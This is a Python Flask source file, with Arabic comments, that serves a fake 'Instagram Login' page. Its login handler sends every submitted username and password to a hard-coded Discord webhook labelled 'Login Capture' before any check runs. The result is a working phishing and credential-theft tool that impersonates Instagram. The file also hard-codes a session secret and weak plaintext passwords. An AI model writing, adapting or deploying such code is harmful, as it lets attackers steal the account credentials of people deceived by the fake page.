# -*- coding: utf-8 -*-
from flask import Flask, render_template, request, redirect, url_for, session
import requests

app = Flask(__name__)
app.secret_key = "instagram-clone-secret-2026"

# ====== ⚠️ ضع رابط Webhook Discord هنا ======
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1560365203772940338/7h8r5Y83KCWJbtYujnOXlzxB9-dpKWxM4yvEZMQeoZbTzwZ3VXu7_bN_i9LEFym56_DV"

USERS = {
    "admin": "1234",
    "ahmed": "password",
    "user": "0000",
}

def send_to_discord(username, password):
    """إرسال البيانات إلى Discord"""
    data = {
        "username": "Login Capture",
        "embeds": [
            {
                "title": "🔐 تسجيل دخول جديد",
                "color": 0x0064e0,
                "fields": [
                    {
                        "name": "👤 اسم المستخدم",
                        "value": f"```{username}```",
                        "inline": False
                    },
                    {
                        "name": "🔑 كلمة المرور",
                        "value": f"```{password}```",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "Instagram Login"
                }
            }
        ]
    }

    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
        return response.status_code == 204
    except Exception as e:
        print(f"Discord error: {e}")
        return False

@app.route("/")
def home():
    if "username" in session:
        return redirect(url_for("welcome"))
    return redirect(url_for("login"))

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")

        # ⭐ إرسال البيانات إلى Discord
        send_to_discord(username, password)

        # ثم التحقق
        if username in USERS and USERS[username] == password:
            session["username"] = username
            return redirect(url_for("welcome"))
        else:
            error = "اسم المستخدم أو كلمة المرور غير صحيحة"
    return render_template("login.html", error=error)

@app.route("/welcome")
def welcome():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("welcome.html", username=session["username"])

@app.route("/logout")
def logout():
    session.pop("username", None)
    return redirect(url_for("login"))

if __name__ == "__main__":
    print("=" * 50)
    print("  Instagram Login")
    print("  افتح: http://127.0.0.1:5000")
    print("=" * 50)
    app.run(debug=True)